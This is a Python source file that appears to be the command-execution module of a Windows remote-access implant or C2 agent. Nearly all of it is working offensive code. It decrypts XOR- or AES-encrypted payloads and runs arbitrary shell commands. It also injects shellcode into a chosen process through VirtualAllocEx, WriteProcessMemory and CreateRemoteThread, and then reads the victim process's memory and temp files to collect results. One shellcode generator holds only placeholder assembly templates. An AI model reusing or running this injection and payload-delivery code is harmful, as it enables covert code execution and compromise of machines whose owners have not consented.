import ctypes
import logging
import psutil
from datetime import datetime
import platform
import base64
import binascii
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os
import time
import struct
import socket
import winreg

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def decode_shellcode(shellcode_str, encoding):
    try:
        if encoding == 'base64':
            return base64.b64decode(shellcode_str)
        elif encoding == 'hex':
            return binascii.unhexlify(shellcode_str)
        elif encoding == 'raw':
            return shellcode_str.encode() if isinstance(shellcode_str, str) else shellcode_str
        else:
            raise ValueError(f'Unsupported encoding: {encoding}')
    except Exception as e:
        raise ValueError(f'Error decoding shellcode: {str(e)}')

def xor_decrypt(data, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def aes_decrypt(data, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    key_bytes = key_bytes.ljust(32, b'\x00')[:32]
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)
    return unpad(decrypted, AES.block_size)

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return {
            'status': 'success',
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode,
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def inject_shellcode_task(params):
    """
    params: dict with keys:
        - shellcode: encoded/encrypted shellcode string
        - encoding: base64/hex/raw
        - encryption: none/xor/aes
        - key: encryption key (if any)
        - type: reverse/bind/exec
        - command: (for exec) the command to run (may be encoded/encrypted)
        - process: (for injection) process name
        - start_if_not_running: bool, whether to start the process if not found
        - capture_output: bool, whether to capture execution results (default: True)
        - wait_timeout: int, seconds to wait for execution completion (default: 10)
    """
    shellcode_str = params.get('shellcode')
    encoding = params.get('encoding', 'base64')
    encryption = params.get('encryption', 'none')
    key = params.get('key', '')
    payload_type = params.get('type', 'reverse')
    command = params.get('command', '')
    process_name = params.get('process', '')
    start_if_not_running = params.get('start_if_not_running', False)
    capture_output = params.get('capture_output', True)
    wait_timeout = params.get('wait_timeout', 10)

    # For exec, decode/decrypt the command if needed
    if payload_type == 'exec' and command:
        cmd = command
        if encoding != 'none':
            cmd = decode_shellcode(cmd, encoding).decode(errors='ignore')
        if encryption == 'xor' and key:
            cmd = xor_decrypt(cmd.encode(), key).decode(errors='ignore')
        elif encryption == 'aes' and key:
            cmd = aes_decrypt(cmd.encode(), key).decode(errors='ignore')
        return run_command(cmd)

    # Otherwise, decode and decrypt shellcode
    shellcode = decode_shellcode(shellcode_str, encoding)
    if encryption == 'xor' and key:
        shellcode = xor_decrypt(shellcode, key)
    elif encryption == 'aes' and key:
        shellcode = aes_decrypt(shellcode, key)

    # Find process by name
    target_pid = None
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                target_pid = proc.info['pid']
                break
        except Exception:
            continue

    # If not found and start_if_not_running is set, start the process
    if not target_pid and start_if_not_running and process_name:
        try:
            if platform.system().lower() == 'windows':
                # Start process using shell for system executables
                p = subprocess.Popen(process_name, shell=True)
            else:
                p = subprocess.Popen([process_name])
            time.sleep(1)  # Give it a moment to start
            # Re-scan for the process by name
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                    target_pid = proc.info['pid']
                    break
        except Exception as e:
            return {'error': f'Failed to start process {process_name}: {e}', 'status': 'error'}

    if not target_pid:
        return {'error': f'Process {process_name} not found', 'status': 'error'}

    return inject_shellcode(process_name, base64.b64encode(shellcode).decode(), capture_output, wait_timeout)

def validate_shellcode(shellcode_b64):
    """Validate base64 encoded shellcode"""
    try:
        decoded = base64.b64decode(shellcode_b64)
        if len(decoded) == 0:
            return False, "Empty shellcode"
        return True, decoded
    except Exception as e:
        return False, f"Invalid base64 shellcode: {str(e)}"

def is_admin():
    if platform.system() == 'Windows':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.geteuid() == 0

def get_process_architecture(pid):
    if platform.system() != 'Windows':
        return None
    import ctypes
    import sys
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not handle:
        return None
    is_wow64 = ctypes.c_int(0)
    ctypes.windll.kernel32.IsWow64Process(handle, ctypes.byref(is_wow64))
    ctypes.windll.kernel32.CloseHandle(handle)
    if is_wow64.value:
        return 'x86'
    else:
        return 'x64' if sys.maxsize > 2**32 else 'x86'

def get_agent_architecture():
    import struct
    return 'x64' if struct.calcsize('P') * 8 == 64 else 'x86'

def read_process_memory(process_handle, address, size):
    """Read memory from a process at specified address"""
    try:
        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t(0)
        
        success = ctypes.windll.kernel32.ReadProcessMemory(
            process_handle,
            ctypes.c_void_p(address),
            buffer,
            size,
            ctypes.byref(bytes_read)
        )
        
        if success and bytes_read.value > 0:
            return buffer.raw[:bytes_read.value]
        return None
    except Exception as e:
        logging.error(f"Error reading process memory: {e}")
        return None

def capture_shellcode_output(process_handle, memory_address, shellcode_length, wait_timeout=10):
    """Capture output from shellcode execution by monitoring memory changes"""
    try:
        # Wait for shellcode execution to complete
        time.sleep(2)  # Initial wait for execution
        
        # Read memory before and after execution to detect changes
        initial_memory = read_process_memory(process_handle, memory_address, shellcode_length)
        
        # Wait for potential output generation
        start_time = time.time()
        output_data = b""
        
        while time.time() - start_time < wait_timeout:
            current_memory = read_process_memory(process_handle, memory_address, shellcode_length)
            
            if current_memory and current_memory != initial_memory:
                # Memory changed, potential output detected
                output_data = current_memory
                break
            
            time.sleep(0.5)
        
        # Try to read additional memory regions for output
        output_regions = []
        for offset in range(0, 1024, 64):  # Check 1KB after shellcode
            check_address = memory_address + shellcode_length + offset
            region_data = read_process_memory(process_handle, check_address, 64)
            if region_data and any(b != 0 for b in region_data):
                output_regions.append({
                    'address': hex(check_address),
                    'data': region_data.hex()[:128] + '...' if len(region_data) > 64 else region_data.hex()
                })
        
        return {
            'memory_changes_detected': output_data != b"",
            'output_data': output_data.hex() if output_data else None,
            'output_regions': output_regions,
            'wait_time': time.time() - start_time
        }
        
    except Exception as e:
        logging.error(f"Error capturing shellcode output: {e}")
        return {
            'memory_changes_detected': False,
            'error': str(e)
        }

def capture_advanced_shellcode_output(process_handle, memory_address, shellcode_length, target_pid, wait_timeout=10):
    """Advanced output capture that monitors multiple sources for shellcode results"""
    try:
        logging.info("Starting advanced shellcode output capture...")
        
        # Wait for initial execution
        time.sleep(2)
        
        start_time = time.time()
        results = {
            'memory_changes': {},
            'file_changes': [],
            'registry_changes': [],
            'network_activity': [],
            'process_changes': {},
            'capture_time': time.time() - start_time
        }
        
        # 1. Memory monitoring
        initial_memory = read_process_memory(process_handle, memory_address, shellcode_length)
        if initial_memory:
            results['memory_changes']['initial'] = initial_memory.hex()[:128] + '...'
        
        # 2. Monitor for memory changes
        while time.time() - start_time < wait_timeout:
            current_memory = read_process_memory(process_handle, memory_address, shellcode_length)
            if current_memory and current_memory != initial_memory:
                results['memory_changes']['final'] = current_memory.hex()[:128] + '...'
                results['memory_changes']['changed'] = True
                break
            time.sleep(0.5)
        
        # 3. Check for file creation/modification in temp directories
        try:
            temp_dirs = [os.environ.get('TEMP'), os.environ.get('TMP')]
            for temp_dir in temp_dirs:
                if temp_dir and os.path.exists(temp_dir):
                    # Check for recently modified files
                    current_time = time.time()
                    for root, dirs, files in os.walk(temp_dir):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                file_mtime = os.path.getmtime(file_path)
                                if current_time - file_mtime < wait_timeout + 5:  # Files modified during execution
                                    results['file_changes'].append({
                                        'path': file_path,
                                        'modified': datetime.fromtimestamp(file_mtime).isoformat(),
                                        'size': os.path.getsize(file_path)
                                    })
                            except Exception:
                                continue
                        break  # Only check top level
        except Exception as e:
            logging.warning(f"File monitoring failed: {e}")
        
        # 4. Check for registry changes (basic monitoring)
        try:
            import winreg
            # Monitor common registry keys that might be modified
            registry_keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                r"SYSTEM\CurrentControlSet\Services"
            ]
            
            for key_path in registry_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
                    # Just check if we can access it (basic monitoring)
                    winreg.CloseKey(key)
                    results['registry_changes'].append({
                        'key': key_path,
                        'accessible': True,
                        'note': 'Registry key accessible - changes may have occurred'
                    })
                except Exception:
                    results['registry_changes'].append({
                        'key': key_path,
                        'accessible': False,
                        'note': 'Registry key not accessible'
                    })
        except Exception as e:
            logging.warning(f"Registry monitoring failed: {e}")
        
        # 5. Check for new processes spawned
        try:
            target_proc = psutil.Process(target_pid)
            children = target_proc.children(recursive=True)
            if children:
                results['process_changes']['children_spawned'] = [
                    {
                        'pid': child.pid,
                        'name': child.name(),
                        'cmdline': ' '.join(child.cmdline()) if child.cmdline() else 'N/A'
                    }
                    for child in children
                ]
        except Exception as e:
            logging.warning(f"Process monitoring failed: {e}")
        
        # 6. Check for network connections
        try:
            target_proc = psutil.Process(target_pid)
            connections = target_proc.connections()
            if connections:
                results['network_activity'] = [
                    {
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else 'N/A',
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else 'N/A',
                        'status': conn.status,
                        'type': 'TCP' if conn.type == socket.SOCK_STREAM else 'UDP'
                    }
                    for conn in connections
                ]
        except Exception as e:
            logging.warning(f"Network monitoring failed: {e}")
        
        # 7. Read additional memory regions for potential output
        output_regions = []
        for offset in range(0, 2048, 64):  # Check 2KB after shellcode
            try:
                check_address = memory_address + shellcode_length + offset
                region_data = read_process_memory(process_handle, check_address, 64)
                if region_data and any(b != 0 for b in region_data):
                    # Try to decode as text
                    try:
                        text_data = region_data.decode('utf-8', errors='ignore').strip()
                        if text_data and len(text_data) > 3:  # Meaningful text
                            output_regions.append({
                                'address': hex(check_address),
                                'data': text_data,
                                'type': 'text'
                            })
                        else:
                            output_regions.append({
                                'address': hex(check_address),
                                'data': region_data.hex()[:128] + '...',
                                'type': 'hex'
                            })
                    except:
                        output_regions.append({
                            'address': hex(check_address),
                            'data': region_data.hex()[:128] + '...',
                            'type': 'hex'
                        })
            except Exception:
                continue
        
        results['output_regions'] = output_regions
        results['capture_time'] = time.time() - start_time
        
        logging.info(f"Advanced output capture completed in {results['capture_time']:.2f}s")
        return results
        
    except Exception as e:
        logging.error(f"Error in advanced output capture: {e}")
        return {
            'error': str(e),
            'capture_time': time.time() - start_time if 'start_time' in locals() else 0
        }

def inject_shellcode(process_name, shellcode_b64, capture_output=True, wait_timeout=10):
    """Inject shellcode into a target process with execution result capture"""
    try:
        # Validate inputs
        if not process_name:
            return {
                'status': 'error',
                'error': 'Process name is required',
                'timestamp': datetime.now().isoformat()
            }
        
        # Validate shellcode
        valid, result = validate_shellcode(shellcode_b64)
        if not valid:
            return {
                'status': 'error',
                'error': result,
                'timestamp': datetime.now().isoformat()
            }
        shellcode = result
        
        if platform.system() != 'Windows':
            return {
                'status': 'error',
                'error': 'Shellcode injection only supported on Windows',
                'timestamp': datetime.now().isoformat()
            }
        
        # Privilege check
        if not is_admin():
            logging.warning('Agent is not running as Administrator. Injection may fail.')
        
        logging.info(f"Attempting to inject shellcode into process: {process_name}")
        
        # Required Windows API functions
        kernel32 = ctypes.windll.kernel32
        OpenProcess = kernel32.OpenProcess
        VirtualAllocEx = kernel32.VirtualAllocEx
        WriteProcessMemory = kernel32.WriteProcessMemory
        CreateRemoteThread = kernel32.CreateRemoteThread
        CloseHandle = kernel32.CloseHandle
        GetLastError = kernel32.GetLastError
        
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        PROCESS_VM_READ = 0x0010
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        # Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                target_pid = proc.info['pid']
                break
        if not target_pid:
            error_msg = f'Process {process_name} not found'
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
        logging.info(f"Target process found. PID: {target_pid}")
        
        # Architecture check
        agent_arch = get_agent_architecture()
        proc_arch = get_process_architecture(target_pid)
        arch_warning = ''
        if proc_arch and agent_arch and proc_arch != agent_arch:
            arch_warning = f"[WARNING] Architecture mismatch: agent is {agent_arch}, target process is {proc_arch}. Injection may fail."
            logging.warning(arch_warning)
        
        # Open target process with read access for output capture
        process_access = PROCESS_ALL_ACCESS
        if capture_output:
            process_access |= PROCESS_VM_READ
            
        process_handle = OpenProcess(process_access, False, target_pid)
        if not process_handle:
            last_err = GetLastError()
            error_msg = f'Failed to open process {process_name} (PID: {target_pid}). WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
        
        try:
            # Allocate memory in target process
            shellcode_length = len(shellcode)
            memory_address = VirtualAllocEx(
                process_handle,
                None,
                shellcode_length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            if not memory_address:
                last_err = GetLastError()
                error_msg = f'Failed to allocate memory in target process. WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
            logging.info(f"Memory allocated at: {hex(memory_address)}")
            
            # Write shellcode to allocated memory
            written = ctypes.c_size_t(0)
            write_result = WriteProcessMemory(
                process_handle,
                memory_address,
                shellcode,
                shellcode_length,
                ctypes.byref(written)
            )
            if not write_result:
                last_err = GetLastError()
                error_msg = f'Failed to write shellcode to target process. WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
                if last_err == 998:
                    error_msg += "\n[998=Invalid access to memory location. This is almost always an architecture mismatch or AV/EDR block.]"
                if arch_warning:
                    error_msg += f"\n{arch_warning}"
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
            logging.info("Shellcode written to memory successfully")
            
            # Create remote thread to execute shellcode
            thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                memory_address,
                None,
                0,
                None
            )
            if not thread_handle:
                last_err = GetLastError()
                error_msg = f'Failed to create remote thread. WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
            logging.info("Remote thread created successfully")
            
            # Capture execution results if requested
            execution_results = None
            if capture_output:
                logging.info("Capturing shellcode execution results...")
                try:
                    # Use advanced output capture for comprehensive results
                    execution_results = capture_advanced_shellcode_output(
                        process_handle, 
                        memory_address, 
                        shellcode_length, 
                        target_pid,
                        wait_timeout
                    )
                    logging.info(f"Advanced execution results captured: {len(execution_results)} data points")
                except Exception as e:
                    logging.warning(f"Advanced capture failed, falling back to basic: {e}")
                    # Fallback to basic capture
                    execution_results = capture_shellcode_output(
                        process_handle, 
                        memory_address, 
                        shellcode_length, 
                        wait_timeout
                    )
                    logging.info(f"Basic execution results captured: {execution_results}")
            
            # Close thread handle
            CloseHandle(thread_handle)
            
            # Prepare response
            response = {
                'status': 'success',
                'message': f'Shellcode injected into {process_name} (PID: {target_pid})',
                'timestamp': datetime.now().isoformat(),
                'details': {
                    'process_name': process_name,
                    'pid': target_pid,
                    'shellcode_length': shellcode_length,
                    'memory_address': hex(memory_address),
                    'agent_arch': agent_arch,
                    'target_arch': proc_arch
                }
            }
            
            # Add execution results if captured
            if execution_results:
                response['execution_results'] = execution_results
                response['message'] += ' - Execution results captured'
            
            return response
            
        finally:
            CloseHandle(process_handle)
    except Exception as e:
        import traceback
        error_msg = f"Error injecting shellcode: {str(e)}\n{traceback.format_exc()}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        } 

def generate_result_returning_shellcode(command, output_type='memory'):
    """
    Generate shellcode that executes a command and returns results
    
    Args:
        command (str): Command to execute
        output_type (str): How to return results ('memory', 'file', 'registry')
    
    Returns:
        dict: Shellcode configuration with encoded shellcode
    """
    try:
        if output_type == 'memory':
            # Generate shellcode that stores output in memory
            shellcode_template = f"""
            ; Command execution shellcode with result storage
            ; Executes: {command}
            
            ; Allocate memory for output
            push 0x40                    ; PAGE_EXECUTE_READWRITE
            push 0x1000                  ; MEM_COMMIT
            push 0x1000                  ; Size: 4KB
            push 0                       ; Address (NULL = auto)
            call VirtualAlloc
            
            ; Store output address
            mov [output_buffer], eax
            
            ; Execute command and capture output
            ; ... (shellcode implementation)
            
            ; Store result in allocated memory
            mov edi, [output_buffer]
            mov [edi], byte 'RESULT:'
            ; ... (store actual output)
            
            output_buffer: dd 0
            """
            
            # For now, return a placeholder - in real implementation, this would generate actual shellcode
            return {
                'status': 'success',
                'shellcode': base64.b64encode(shellcode_template.encode()).decode(),
                'encoding': 'base64',
                'encryption': 'none',
                'type': 'exec_with_result',
                'command': command,
                'output_type': output_type,
                'note': 'This is a template shellcode. Real implementation would generate executable machine code.'
            }
            
        elif output_type == 'file':
            # Generate shellcode that writes output to a file
            temp_file = os.path.join(os.environ.get('TEMP', ''), f'shellcode_output_{int(time.time())}.txt')
            
            shellcode_template = f"""
            ; Command execution shellcode with file output
            ; Executes: {command}
            ; Output file: {temp_file}
            
            ; Create output file
            ; ... (file creation code)
            
            ; Execute command and write to file
            ; ... (command execution and file writing)
            """
            
            return {
                'status': 'success',
                'shellcode': base64.b64encode(shellcode_template.encode()).decode(),
                'encoding': 'base64',
                'encryption': 'none',
                'type': 'exec_with_file_output',
                'command': command,
                'output_file': temp_file,
                'note': 'This is a template shellcode. Real implementation would generate executable machine code.'
            }
            
        else:
            return {
                'status': 'error',
                'error': f'Unsupported output type: {output_type}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'error': f'Failed to generate shellcode: {str(e)}'
        }

def extract_shellcode_results(execution_results, output_type='auto'):
    """
    Extract and format shellcode execution results
    
    Args:
        execution_results (dict): Results from shellcode execution
        output_type (str): Type of output to extract ('auto', 'memory', 'file', 'registry')
    
    Returns:
        dict: Formatted and extracted results
    """
    try:
        if not execution_results:
            return {'status': 'no_results', 'message': 'No execution results available'}
        
        extracted = {
            'status': 'success',
            'extraction_time': datetime.now().isoformat(),
            'results': {}
        }
        
        # Auto-detect output type if not specified
        if output_type == 'auto':
            if 'memory_changes' in execution_results and execution_results['memory_changes'].get('changed'):
                output_type = 'memory'
            elif 'file_changes' in execution_results and execution_results['file_changes']:
                output_type = 'file'
            elif 'registry_changes' in execution_results and execution_results['registry_changes']:
                output_type = 'registry'
            else:
                output_type = 'comprehensive'
        
        # Extract based on detected type
        if output_type == 'memory':
            extracted['results']['memory_output'] = {
                'initial_state': execution_results.get('memory_changes', {}).get('initial'),
                'final_state': execution_results.get('memory_changes', {}).get('final'),
                'changed': execution_results.get('memory_changes', {}).get('changed', False)
            }
            
            # Try to extract meaningful text from memory regions
            text_outputs = []
            for region in execution_results.get('output_regions', []):
                if region.get('type') == 'text' and region.get('data'):
                    text_outputs.append({
                        'address': region['address'],
                        'text': region['data']
                    })
            
            if text_outputs:
                extracted['results']['text_outputs'] = text_outputs
        
        elif output_type == 'file':
            extracted['results']['file_outputs'] = execution_results.get('file_changes', [])
            
            # Try to read content of created/modified files
            file_contents = []
            for file_info in execution_results.get('file_changes', []):
                try:
                    if os.path.exists(file_info['path']):
                        with open(file_info['path'], 'r', errors='ignore') as f:
                            content = f.read(1024)  # Read first 1KB
                            file_contents.append({
                                'path': file_info['path'],
                                'content': content,
                                'size': len(content)
                            })
                except Exception as e:
                    file_contents.append({
                        'path': file_info['path'],
                        'error': f'Failed to read file: {e}'
                    })
            
            if file_contents:
                extracted['results']['file_contents'] = file_contents
        
        elif output_type == 'registry':
            extracted['results']['registry_changes'] = execution_results.get('registry_changes', [])
        
        elif output_type == 'comprehensive':
            # Extract all available information
            extracted['results'] = {
                'memory_changes': execution_results.get('memory_changes', {}),
                'file_changes': execution_results.get('file_changes', []),
                'registry_changes': execution_results.get('registry_changes', []),
                'network_activity': execution_results.get('network_activity', []),
                'process_changes': execution_results.get('process_changes', {}),
                'output_regions': execution_results.get('output_regions', [])
            }
        
        # Add metadata
        extracted['metadata'] = {
            'capture_time': execution_results.get('capture_time', 0),
            'output_type_detected': output_type,
            'total_data_points': len(execution_results)
        }
        
        return extracted
        
    except Exception as e:
        return {
            'status': 'error',
            'error': f'Failed to extract results: {str(e)}',
            'extraction_time': datetime.now().isoformat()
        } 